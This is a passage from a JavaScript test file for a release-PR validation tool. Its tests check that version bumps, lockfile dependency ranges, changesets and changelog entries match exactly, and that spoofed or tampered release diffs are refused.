      { path: "docs/changelogs/core.md", status: "modified", baseContent: f.coreChangelogBase, headContent: f.coreChangelogHead },
      { path: "packages/consumer/package.json", status: "modified", baseContent: f.consumerBase, headContent: f.consumerHead },
      { path: "docs/changelogs/consumer.md", status: "modified", baseContent: f.consumerChangelogBase, headContent: f.consumerChangelogHead },
      { path: "package-lock.json", status: "modified", baseContent: f.lockfileBase, headContent: f.lockfileHead },
      { path: ".changesets/core-feature.md", status: "removed", baseContent: f.changesetText },
      // consumer is NOT named by any changeset -- its own bump is entirely a
      // consequence of core's minor bump moving outside its declared range,
      // so there is no consumer changeset to delete, matching #1338's own
      // real (captured, not simulated) output.
    ],
  });
  assert.equal(result.ok, true, result.reason);
});

// ADVERSARIAL: the same vendored capture, but with the lockfile's dependent
// range rewritten to a WRONG version (neither the pre-bump ^0.9.0 nor the
// actually-bumped ^0.10.0) -- proving the widened lockfile rule still
// refuses a range that does not match exactly `^<the version this diff
// actually bumped core to>`, exercising the same boundary
// isAllowedDependencyRangeChange() already enforces for the manifest, now
// against a real, npm-regenerated lockfile shape rather than a synthetic one.
test("ADVERSARIAL END TO END (vendored composed-producer capture): if the lockfile's consumer entry is rewritten to a range OTHER than ^<the version core was actually bumped to>, the footprint check fails", () => {
  const f = COMPOSED_PRODUCER_FIXTURE;
  const wrongRangeLockfileHead = f.lockfileHead.replace('"@x/core": "^0.10.0"', '"@x/core": "^0.99.0"');
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/core/package.json", status: "modified", baseContent: f.coreBase, headContent: f.coreHead },
      { path: "docs/changelogs/core.md", status: "modified", baseContent: f.coreChangelogBase, headContent: f.coreChangelogHead },
      { path: "packages/consumer/package.json", status: "modified", baseContent: f.consumerBase, headContent: f.consumerHead },
      { path: "docs/changelogs/consumer.md", status: "modified", baseContent: f.consumerChangelogBase, headContent: f.consumerChangelogHead },
      { path: "package-lock.json", status: "modified", baseContent: f.lockfileBase, headContent: wrongRangeLockfileHead },
      { path: ".changesets/core-feature.md", status: "removed", baseContent: f.changesetText },
    ],
  });
  assert.equal(result.ok, false);
});

// ---------------------------------------------------------------- END TO END: the changeset-consumption spoof cases (re-review, blocking)
//
// https://github.com/clossys/foundry/pull/1353#issuecomment-5803854341 --
// a prior round's substring check (`section.includes(summary)`) accepted
// an extra, unconsumed changeset deletion whenever its summary happened to
// be a substring of (or identical to) something already in the real
// CHANGELOG section. Each of these five is one of the reviewer's own named
// spoof cases, applied to the SAME vendored composed-producer fixture
// above: an EXTRA `.changesets/*.md` file is deleted alongside the two
// legitimate ones, and the footprint check must refuse the WHOLE diff,
// because reconstructExpectedChangelogText() rebuilds the bullet list
// from EVERY deleted changeset naming that package and requires an EXACT
// byte match -- an extra bullet (even one whose text repeats or
// substring-matches something real) always breaks that match.

function footprintFilesWithExtraChangeset(extraFile) {
  const f = COMPOSED_PRODUCER_FIXTURE;
  return [
    { path: "packages/core/package.json", status: "modified", baseContent: f.coreBase, headContent: f.coreHead },
    { path: "docs/changelogs/core.md", status: "modified", baseContent: f.coreChangelogBase, headContent: f.coreChangelogHead },
    { path: "packages/consumer/package.json", status: "modified", baseContent: f.consumerBase, headContent: f.consumerHead },
    { path: "docs/changelogs/consumer.md", status: "modified", baseContent: f.consumerChangelogBase, headContent: f.consumerChangelogHead },
    { path: "package-lock.json", status: "modified", baseContent: f.lockfileBase, headContent: f.lockfileHead },
    { path: ".changesets/core-feature.md", status: "removed", baseContent: f.changesetText },
    extraFile,
  ];
}

test("ADVERSARIAL SPOOF END TO END: an extra deleted changeset naming consumer, whose summary is IDENTICAL to the producer's own auto-generated dependency bullet, is refused", () => {
  const extraFile = { path: ".changesets/mid-spoof-1.md", status: "removed", baseContent: "---\nconsumer: minor\n---\n\nUpdated dependency @x/core to ^0.10.0\n" };
  const result = evaluateReleasePrFootprint({ files: footprintFilesWithExtraChangeset(extraFile) });
  assert.equal(result.ok, false);
});

test("ADVERSARIAL SPOOF END TO END: an extra deleted changeset naming consumer, whose summary is a SUBSTRING of the real auto-generated bullet ('core'), is refused", () => {
  const extraFile = { path: ".changesets/mid-spoof-2.md", status: "removed", baseContent: "---\nconsumer: minor\n---\n\ncore\n" };
  const result = evaluateReleasePrFootprint({ files: footprintFilesWithExtraChangeset(extraFile) });
  assert.equal(result.ok, false);
});

test("ADVERSARIAL SPOOF END TO END: an extra deleted changeset naming consumer, whose summary is a SUBSTRING of the real bullet ('0.10.0'), is refused", () => {
  const extraFile = { path: ".changesets/mid-spoof-3.md", status: "removed", baseContent: "---\nconsumer: patch\n---\n\n0.10.0\n" };
  const result = evaluateReleasePrFootprint({ files: footprintFilesWithExtraChangeset(extraFile) });
  assert.equal(result.ok, false);
});

test("ADVERSARIAL SPOOF END TO END: an extra deleted changeset naming core, with a summary IDENTICAL to the real consumed changeset's own summary, is refused (a duplicate bullet is not the same as the real one)", () => {
  const extraFile = { path: ".changesets/core-spoof-4.md", status: "removed", baseContent: "---\ncore: major\n---\n\nAdd a feature.\n" };
  const result = evaluateReleasePrFootprint({ files: footprintFilesWithExtraChangeset(extraFile) });
  assert.equal(result.ok, false);
});

test("ADVERSARIAL SPOOF END TO END: an extra deleted changeset naming core, whose summary is a SUBSTRING of the real consumed changeset's summary ('Add'), is refused", () => {
  const extraFile = { path: ".changesets/core-spoof-5.md", status: "removed", baseContent: "---\ncore: patch\n---\n\nAdd\n" };
  const result = evaluateReleasePrFootprint({ files: footprintFilesWithExtraChangeset(extraFile) });
  assert.equal(result.ok, false);
});

test("CONTROL SPOOF END TO END: an extra deleted changeset naming consumer with a genuinely UNRELATED summary is refused too (the baseline the five spoof cases above are compared against)", () => {
  const extraFile = { path: ".changesets/mid-unrelated.md", status: "removed", baseContent: "---\nconsumer: minor\n---\n\nSomething entirely unrelated.\n" };
  const result = evaluateReleasePrFootprint({ files: footprintFilesWithExtraChangeset(extraFile) });
  assert.equal(result.ok, false);
});

// ---------------------------------------------------------------- isLockfilePureVersionBump: widened dependent-range rule (real repo lockfile shapes)
//
// Re-review item 1: the lockfile check previously allowed ONLY `version`
// fields to change inside a bumped package's `packages/<dir>` entry, so any
// real release that also rewrites a dependent's range (as #1338 does, and as
// npm itself does when the lockfile is regenerated) always failed. These
// fixtures are drawn from THIS repository's own real package-lock.json
// workspace-member shapes (packages/publisher, packages/designer), not a
// simplified approximation, per the reviewer's explicit request.

const REAL_PUBLISHER_LOCKFILE_ENTRY_BASE = {
  name: "@clossys/publisher",
  version: "0.4.24",
  license: "MIT",
  dependencies: {
    "@clossys/controller": "~0.9.0",
    "@clossys/designer": "^0.4.0",
    "@clossys/writer": "^0.3.0",
  },
  bin: {
    "publisher-build": "bin/build.js",
    "publisher-dev": "bin/dev.js",
    "publisher-init": "bin/init.js",
    "publisher-publish": "bin/publish.js",
    "publisher-verify": "bin/verify.js",
  },
  devDependencies: {
    "@internationalized/date": "^3.5.0",
    "@testing-library/jest-dom": "^6.4.0",
  },
  engines: { node: ">=20" },
  peerDependencies: {
    react: "^18.0.0 || ^19.0.0",
    "react-dom": "^18.0.0 || ^19.0.0",
    typescript: "^5.0.0",
    vite: "^5.0.0 || ^6.0.0",
    webpack: "^5.0.0",
    next: "^14.0.0 || ^15.0.0",
  },
  peerDependenciesMeta: {
    react: { optional: true },
    "react-dom": { optional: true },
    typescript: { optional: true },
    vite: { optional: true },
    webpack: { optional: true },
    next: { optional: true },
  },
};

function realLockfileFixture(publisherEntryOverrides) {
  return (
    JSON.stringify(
      {
        name: "foundry",
        lockfileVersion: 3,
        requires: true,
        packages: {
          "": { name: "foundry", workspaces: ["packages/*"] },
          "node_modules/@clossys/designer": { resolved: "packages/designer", link: true },
          "node_modules/@clossys/controller": { resolved: "packages/controller", link: true },
          "packages/designer": { name: "@clossys/designer", version: "0.4.17", license: "MIT", peerDependencies: { react: "^18.0.0 || ^19.0.0" } },
          "packages/publisher": { ...REAL_PUBLISHER_LOCKFILE_ENTRY_BASE, ...publisherEntryOverrides },
        },
      },
      null,
      2,
    ) + "\n"
  );
}

// Builds the manifest cross-check data for "@clossys/publisher" matching
// the SAME `overrides` object used to build a `realLockfileFixture(...)`
// head -- so a test that deliberately tampers the LOCKFILE's own internal
// shape (an added/removed/reordered dependency, a devDependencies move) can
// still supply manifest data that mirrors the lockfile's own (tampered)
// state, keeping the pre-existing per-field checks -- not this new
// lockfile-vs-manifest cross-check -- the ones isolating each test's own
// named defect. Only the four fields the cross-check reads are extracted.
function publisherManifestFor(overrides) {
  const merged = { ...REAL_PUBLISHER_LOCKFILE_ENTRY_BASE, ...overrides };
  return {
    "@clossys/publisher": {
      version: merged.version,
      dependencies: merged.dependencies,
      peerDependencies: merged.peerDependencies,
      optionalDependencies: merged.optionalDependencies,
      devDependencies: merged.devDependencies,
    },
  };
}

test("isLockfilePureVersionBump: a real publisher lockfile entry's dependencies range rewritten to exactly ^<bumped version> of a package this diff bumps passes", () => {
  const base = realLockfileFixture({ version: "0.4.24" });
  const overrides = { version: "0.4.25", dependencies: { ...REAL_PUBLISHER_LOCKFILE_ENTRY_BASE.dependencies, "@clossys/designer": "^0.5.0" } };
  const head = realLockfileFixture(overrides);
  const result = isLockfilePureVersionBump(base, head, ["publisher"], { "@clossys/designer": "0.5.0" }, publisherManifestFor(overrides));
  assert.equal(result, true);
});

test("ADVERSARIAL isLockfilePureVersionBump: a real publisher lockfile entry's peerDependencies range rewritten to exactly ^<bumped version> passes too (all three dependent-range fields are covered, not just dependencies)", () => {
  const base = realLockfileFixture({ version: "0.4.24" });
  const overrides = { version: "0.4.25", peerDependencies: { ...REAL_PUBLISHER_LOCKFILE_ENTRY_BASE.peerDependencies, next: "^0.5.0" } };
  const head = realLockfileFixture(overrides);
  const result = isLockfilePureVersionBump(base, head, ["publisher"], { next: "0.5.0" }, publisherManifestFor(overrides));
  assert.equal(result, true);
});

// npm writes a lockfile workspace entry's dependency maps in SORTED key
// order regardless of the source package.json's own declaration order --
// confirmed against this repository's real packages/publisher (unsorted
// dependencies/devDependencies) and packages/designer (unsorted
// peerDependencies). The manifest-cross-check must be key-order
// INSENSITIVE (same key set, same values), unlike the lockfile's own
// base-vs-head rewrite check just above, which stays key-order sensitive
// on purpose (re-review, https://github.com/clossys/foundry/pull/1353#issuecomment-5803894960
// blocking item 1 -- an earlier round's JSON.stringify comparison failed
// every real release that bumps either package).
test("isLockfilePureVersionBump: the lockfile's SORTED dependency map still matches an UNSORTED manifest map with the identical keys and values (real publisher/designer shape)", () => {
  const base = realLockfileFixture({ version: "0.4.24" });
  // The lockfile entry keeps npm's own sorted order (controller, designer, writer).
  const overrides = { version: "0.4.25", dependencies: { ...REAL_PUBLISHER_LOCKFILE_ENTRY_BASE.dependencies, "@clossys/designer": "^0.5.0" } };
  const head = realLockfileFixture(overrides);
  // The REAL manifest declares them in a different order -- writer, designer,
  // controller -- exactly as a real package.json is free to.
  const manifestOverrides = {
    version: "0.4.25",
    dependencies: {
      "@clossys/writer": REAL_PUBLISHER_LOCKFILE_ENTRY_BASE.dependencies["@clossys/writer"],
      "@clossys/designer": "^0.5.0",
      "@clossys/controller": REAL_PUBLISHER_LOCKFILE_ENTRY_BASE.dependencies["@clossys/controller"],
    },
  };
  const result = isLockfilePureVersionBump(base, head, ["publisher"], { "@clossys/designer": "0.5.0" }, publisherManifestFor(manifestOverrides));
  assert.equal(result, true);
});

test("ADVERSARIAL isLockfilePureVersionBump: an unsorted manifest map that genuinely DISAGREES with the lockfile (not just reordered) still fails", () => {
  const base = realLockfileFixture({ version: "0.4.24" });
  const overrides = { version: "0.4.25", dependencies: { ...REAL_PUBLISHER_LOCKFILE_ENTRY_BASE.dependencies, "@clossys/designer": "^0.5.0" } };
  const head = realLockfileFixture(overrides);
  // Reordered AND one value genuinely differs (writer's own range, untouched
  // by this diff, silently changed) -- order-insensitivity must not mask a
  // real value mismatch.
  const manifestOverrides = {
    version: "0.4.25",
    dependencies: {
      "@clossys/writer": "^9.9.9", // tampered -- does not match the lockfile's "^0.3.0"
      "@clossys/designer": "^0.5.0",
      "@clossys/controller": REAL_PUBLISHER_LOCKFILE_ENTRY_BASE.dependencies["@clossys/controller"],
    },
  };
  const result = isLockfilePureVersionBump(base, head, ["publisher"], { "@clossys/designer": "0.5.0" }, publisherManifestFor(manifestOverrides));
  assert.equal(result, false);
});

test("ADVERSARIAL isLockfilePureVersionBump: rewriting a dependency range for a package this diff does NOT bump still fails, even though the syntactic shape (a dependency-field range change) matches an allowed one", () => {
  const base = realLockfileFixture({ version: "0.4.24" });
  // @clossys/writer is not in bumpedVersionsByName -- nothing in this diff bumped it.
  const overrides = { version: "0.4.25", dependencies: { ...REAL_PUBLISHER_LOCKFILE_ENTRY_BASE.dependencies, "@clossys/writer": "^0.4.0" } };
  const head = realLockfileFixture(overrides);
  const result = isLockfilePureVersionBump(base, head, ["publisher"], {}, publisherManifestFor(overrides));
  assert.equal(result, false);
});

test("ADVERSARIAL isLockfilePureVersionBump: rewriting a dependency range to a version OTHER than the bumped version fails", () => {
  const base = realLockfileFixture({ version: "0.4.24" });
  const overrides = { version: "0.4.25", dependencies: { ...REAL_PUBLISHER_LOCKFILE_ENTRY_BASE.dependencies, "@clossys/designer": "^0.6.0" } };
  const head = realLockfileFixture(overrides);
  // designer was actually bumped to 0.5.0, not 0.6.0 -- the lockfile entry disagrees.
  const result = isLockfilePureVersionBump(base, head, ["publisher"], { "@clossys/designer": "0.5.0" }, publisherManifestFor(overrides));
  assert.equal(result, false);
});

test("ADVERSARIAL isLockfilePureVersionBump: adding a brand-new dependency entry fails", () => {
  const base = realLockfileFixture({ version: "0.4.24" });
  const overrides = { version: "0.4.25", dependencies: { ...REAL_PUBLISHER_LOCKFILE_ENTRY_BASE.dependencies, "@clossys/new-package": "^1.0.0" } };
  const head = realLockfileFixture(overrides);
  const result = isLockfilePureVersionBump(base, head, ["publisher"], {}, publisherManifestFor(overrides));
  assert.equal(result, false);
});

// devDependencies is now scanned and rewritten too (decision + fix,
// re-review, https://github.com/clossys/foundry/pull/1353#issuecomment-5803457726
// item 3: the workspace's OWN `npm install --package-lock-only` DOES
// resolve devDependencies, unlike a published consumer's install) -- for
// a genuinely bumped package, a devDependencies rewrite to exactly
// `^<the proven new version>` is allowed the identical way dependencies/
// peerDependencies/optionalDependencies already are.
test("isLockfilePureVersionBump: a real publisher lockfile entry's devDependencies range rewritten to exactly ^<bumped version> of a package this diff bumps passes too, for a genuinely bumped package", () => {
  const base = realLockfileFixture({ version: "0.4.24" });
  const overrides = { version: "0.4.25", devDependencies: { ...REAL_PUBLISHER_LOCKFILE_ENTRY_BASE.devDependencies, "@internationalized/date": "^4.0.0" } };
  const head = realLockfileFixture(overrides);
  const result = isLockfilePureVersionBump(base, head, ["publisher"], { "@internationalized/date": "4.0.0" }, publisherManifestFor(overrides));
  assert.equal(result, true);
});

test("ADVERSARIAL isLockfilePureVersionBump: a devDependencies range rewritten to a version OTHER than the bumped version fails, same as the other three fields", () => {
  const base = realLockfileFixture({ version: "0.4.24" });
  const overrides = { version: "0.4.25", devDependencies: { ...REAL_PUBLISHER_LOCKFILE_ENTRY_BASE.devDependencies, "@internationalized/date": "^4.0.0" } };
  const head = realLockfileFixture(overrides);
  // @internationalized/date was actually bumped to 5.0.0, not 4.0.0 -- the lockfile entry disagrees.
  const result = isLockfilePureVersionBump(base, head, ["publisher"], { "@internationalized/date": "5.0.0" }, publisherManifestFor(overrides));
  assert.equal(result, false);
});

test("ADVERSARIAL isLockfilePureVersionBump: a devDependencies range rewritten for a package this diff does NOT bump still fails", () => {
  const base = realLockfileFixture({ version: "0.4.24" });
  const overrides = { version: "0.4.25", devDependencies: { ...REAL_PUBLISHER_LOCKFILE_ENTRY_BASE.devDependencies, "@internationalized/date": "^4.0.0" } };
  const head = realLockfileFixture(overrides);
  const result = isLockfilePureVersionBump(base, head, ["publisher"], {}, publisherManifestFor(overrides));
  assert.equal(result, false);
});

test("ADVERSARIAL isLockfilePureVersionBump: removing a dependency entry fails", () => {
  const base = realLockfileFixture({ version: "0.4.24" });
  const headEntry = { ...REAL_PUBLISHER_LOCKFILE_ENTRY_BASE, version: "0.4.25", dependencies: { ...REAL_PUBLISHER_LOCKFILE_ENTRY_BASE.dependencies } };
  delete headEntry.dependencies["@clossys/writer"];
  const head =
    JSON.stringify(
      {
        name: "foundry",
        lockfileVersion: 3,
        requires: true,
        packages: {
          "": { name: "foundry", workspaces: ["packages/*"] },
          "node_modules/@clossys/designer": { resolved: "packages/designer", link: true },
          "node_modules/@clossys/controller": { resolved: "packages/controller", link: true },
          "packages/designer": { name: "@clossys/designer", version: "0.4.17", license: "MIT", peerDependencies: { react: "^18.0.0 || ^19.0.0" } },
          "packages/publisher": headEntry,
        },
      },
      null,
      2,
    ) + "\n";
  const result = isLockfilePureVersionBump(base, head, ["publisher"], {}, publisherManifestFor({ version: headEntry.version, dependencies: headEntry.dependencies }));
  assert.equal(result, false);
});

test("ADVERSARIAL isLockfilePureVersionBump: reordering the dependencies map (same keys and values, different order) fails, consistent with the manifest rule's key-order sensitivity", () => {
  const base = realLockfileFixture({ version: "0.4.24" });
  const reorderedDependencies = {
    "@clossys/writer": "^0.3.0",
    "@clossys/designer": "^0.4.0",
    "@clossys/controller": "~0.9.0",
  };
  const headEntry = {
    ...REAL_PUBLISHER_LOCKFILE_ENTRY_BASE,
    version: "0.4.25",
    dependencies: reorderedDependencies,
  };
  const head =
    JSON.stringify(
      {
        name: "foundry",
        lockfileVersion: 3,
        requires: true,
        packages: {
          "": { name: "foundry", workspaces: ["packages/*"] },
          "node_modules/@clossys/designer": { resolved: "packages/designer", link: true },
          "node_modules/@clossys/controller": { resolved: "packages/controller", link: true },
          "packages/designer": { name: "@clossys/designer", version: "0.4.17", license: "MIT", peerDependencies: { react: "^18.0.0 || ^19.0.0" } },
          "packages/publisher": headEntry,
        },
      },
      null,
      2,
    ) + "\n";
  // The manifest cross-check reads the SAME reordered map, key-for-key in
  // the SAME order, so it is not what catches this defect -- the
  // pre-existing key-order-sensitive REST comparison inside
  // compareRestAllowingDependencyRangeBumps() is.
  const result = isLockfilePureVersionBump(base, head, ["publisher"], {}, publisherManifestFor({ version: "0.4.25", dependencies: reorderedDependencies }));
  assert.equal(result, false);
});

// ---------------------------------------------------------------- isPackageManifestVersionOnlyChange: the bumped version itself is validated, not trusted
//
// Re-review item 2: the old version check only required the field to
// literally change text -- it never validated that the new text was a
// legitimate semver version at all. These prove the four named refusal
// cases plus a legitimate accept, via the same isPackageManifestVersionOnlyChange
// entry point actual footprint evaluation uses (reusing computeBumpLevel()
// internally, not a second semver implementation).

test("ADVERSARIAL isPackageManifestVersionOnlyChange: a version field set to a semver RANGE (\"0.10.0 || >=0.0.0\") instead of a single version is refused", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", license: "MIT" });
  const head = JSON.stringify({ name: "@x/alpha", version: "0.10.0 || >=0.0.0", license: "MIT" });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
});

test("ADVERSARIAL isPackageManifestVersionOnlyChange: an arbitrary version jump (\"9.9.9\") that is not a single-step patch/minor/major bump is refused", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", license: "MIT" });
  const head = JSON.stringify({ name: "@x/alpha", version: "9.9.9", license: "MIT" });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
});

test("ADVERSARIAL isPackageManifestVersionOnlyChange: a downgrade (\"1.0.0\" -> \"0.8.0\") is refused", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", license: "MIT" });
  const head = JSON.stringify({ name: "@x/alpha", version: "0.8.0", license: "MIT" });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
});

test("ADVERSARIAL isPackageManifestVersionOnlyChange: an unchanged (equal) version is refused -- there is no bump to authorize", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", license: "MIT" });
  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.0", license: "MIT" });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
});

test("ADVERSARIAL isPackageManifestVersionOnlyChange: a prerelease version (\"0.10.0-evil.1\") is refused -- this repository's own semver parsing (check-release-pr-shape.mjs's computeBumpLevel/parseSemver) never accepts a prerelease suffix, so none is authorized here either", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", license: "MIT" });
  const head = JSON.stringify({ name: "@x/alpha", version: "0.10.0-evil.1", license: "MIT" });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
});

test("isPackageManifestVersionOnlyChange: a legitimate single-step minor bump (\"1.0.0\" -> \"1.1.0\") is accepted", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", license: "MIT" });
  const head = JSON.stringify({ name: "@x/alpha", version: "1.1.0", license: "MIT" });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), true);
});

// ---------------------------------------------------------------- changelog location

// The same clean release PR as the first evaluateReleasePrFootprint test
// above, with its changelog entry written at `changelogPath` instead.
function releasePrFilesWithChangelogAt(changelogPath) {
  const [base, head] = manifestPair("1.0.0", "1.0.1", { name: "@clossys/alpha" });
  return [
    { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
    {
      path: changelogPath,
      status: "modified",
      baseContent: "# Changelog\n\n## 1.0.0\n\n- Initial.\n",
      headContent: "# Changelog\n\n## 1.0.1 - 2026-09-24\n\n- Fix.\n\n## 1.0.0\n\n- Initial.\n",
    },
    { path: "package-lock.json", status: "modified", baseContent: LOCK_BASE, headContent: lockWithAlphaBumped("1.0.1") },
    { path: ".changesets/alpha-fix.md", status: "removed", baseContent: "---\nalpha: patch\n---\n\nFix.\n" },
  ];
}

test("evaluateReleasePrFootprint: the changelog entry is accepted at docs/changelogs/<dir>.md", () => {
  const result = evaluateReleasePrFootprint({ files: releasePrFilesWithChangelogAt("docs/changelogs/alpha.md") });
  assert.equal(result.ok, true, result.reason);
});

test("evaluateReleasePrFootprint: the same entry written inside the package (packages/<dir>/CHANGELOG.md) is not release-PR shaped", () => {
  const result = evaluateReleasePrFootprint({ files: releasePrFilesWithChangelogAt("packages/alpha/CHANGELOG.md") });
  assert.equal(result.ok, false);
  assert.match(result.reason, /packages\/alpha\/CHANGELOG\.md.*is not a release-PR-shaped change/);
});

test("evaluateReleasePrFootprint: a change to docs/changelogs/README.md is not a changelog entry and is not release-PR shaped", () => {
  const files = releasePrFilesWithChangelogAt("docs/changelogs/alpha.md");
  files.push({ path: "docs/changelogs/README.md", status: "modified", baseContent: "# Changelogs\n", headContent: "# Changelogs\n\nEdited.\n" });
  const result = evaluateReleasePrFootprint({ files });
  assert.equal(result.ok, false);
  assert.match(result.reason, /docs\/changelogs\/README\.md.*is not a release-PR-shaped change/);
});

test("evaluateReleasePrFootprint: a nested path under docs/changelogs/ is not a changelog entry", () => {
  const files = releasePrFilesWithChangelogAt("docs/changelogs/alpha.md");
  files.push({ path: "docs/changelogs/alpha/extra.md", status: "added", headContent: "# x\n" });
  const result = evaluateReleasePrFootprint({ files });
  assert.equal(result.ok, false);
  assert.match(result.reason, /is not a release-PR-shaped change/);
});

test("evaluateReleasePrFootprint: a changelog entry that does not match the consumed changeset byte for byte still fails at the new location", () => {
  const files = releasePrFilesWithChangelogAt("docs/changelogs/alpha.md");
  files[1] = { ...files[1], headContent: "# Changelog\n\n## 1.0.1 - 2026-09-24\n\n- Something else.\n\n## 1.0.0\n\n- Initial.\n" };
  const result = evaluateReleasePrFootprint({ files });
  assert.equal(result.ok, false);
  assert.match(result.reason, /byte-for-byte/);
});
